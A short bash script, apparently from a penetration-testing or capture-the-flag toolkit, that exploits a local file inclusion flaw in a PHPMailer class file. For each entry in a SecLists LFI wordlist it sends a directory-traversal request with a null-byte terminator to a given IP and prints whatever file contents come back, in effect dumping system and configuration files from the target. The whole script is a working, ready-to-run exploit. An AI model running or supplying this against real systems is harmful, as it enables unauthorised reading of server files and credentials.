#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <IP>"
    exit 1
fi

IP=$1
FUZZING_FILE="/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"

if [ ! -f "$FUZZING_FILE" ]; then
    echo "Error: File '$FUZZING_FILE' not found!"
    exit 1
fi

while IFS= read -r FILE; do
    [[ -z "$FILE" ]] && continue
    URL="http://$IP/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../..$FILE%00"
    printf "\n\e[1;32m[+] Searching for $FILE\e[0m\n"
    curl -s $URL | grep -Ev 'error|fatal|failed|<br.*>'
done < "$FUZZING_FILE"

printf "\n\e[1;32m[*] Fuzzing complete\e[0m\n"
